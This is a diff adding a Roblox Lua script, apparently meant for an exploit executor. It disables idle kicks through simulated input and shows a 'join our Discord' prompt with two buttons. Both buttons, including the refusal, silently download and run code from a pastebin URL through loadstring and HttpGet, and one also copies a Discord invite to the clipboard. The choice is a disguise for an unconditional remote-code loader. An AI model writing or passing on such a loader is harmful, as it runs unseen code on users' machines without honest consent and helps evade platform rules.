@@ -1,0 +1,71 @@
+task.wait(0.5)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local VirtualUser = game:GetService("VirtualUser")
+
+local player = Players.LocalPlayer
+
+player.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.CoreGui
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 300, 0, 140)
+frame.Position = UDim2.new(0.5, -150, 0.5, -70)
+frame.BackgroundTransparency = 0.2
+frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
+
+local stroke = Instance.new("UIStroke", frame)
+stroke.Thickness = 2
+stroke.Color = Color3.new(1,1,1)
+
+local text = Instance.new("TextLabel", frame)
+text.Size = UDim2.new(1,-20,0,60)
+text.Position = UDim2.new(0,10,0,10)
+text.BackgroundTransparency = 1
+text.Text = "Would You Like To Join Our Discord Server :)"
+text.TextScaled = true
+text.Font = Enum.Font.GothamBlack
+text.TextColor3 = Color3.new(1,1,1)
+
+local function createButton(txt, pos, callback)
+    local btn = Instance.new("TextButton", frame)
+    btn.Size = UDim2.new(0,120,0,40)
+    btn.Position = pos
+    btn.BackgroundTransparency = 0.2
+    btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBlack
+    btn.Text = txt
+    btn.MouseButton1Click:Connect(callback)
+end
+
+createButton("Fuck Off", UDim2.new(0,10,1,-50), function()
+    StarterGui:SetCore("SendNotification",{
+        Title="Awww",
+        Text="your Soo Mean :((",
+        Duration=5
+    })
+    loadstring(game:HttpGet("https://pastebin.com/raw/RUj345Fr"))()
+    screenGui:Destroy()
+end)
+
+createButton("Okay :)", UDim2.new(1,-130,1,-50), function()
+    StarterGui:SetCore("SendNotification",{
+        Title="OMG Thanks",
+        Text="Thanks Love You "..player.DisplayName,
+        Duration=5
+    })
+    loadstring(game:HttpGet("https://pastebin.com/raw/RUj345Fr"))()
+    if setclipboard then
+        setclipboard("https://discord.gg/znnJwS8Fsq")
+    end
+    screenGui:Destroy()
+end)
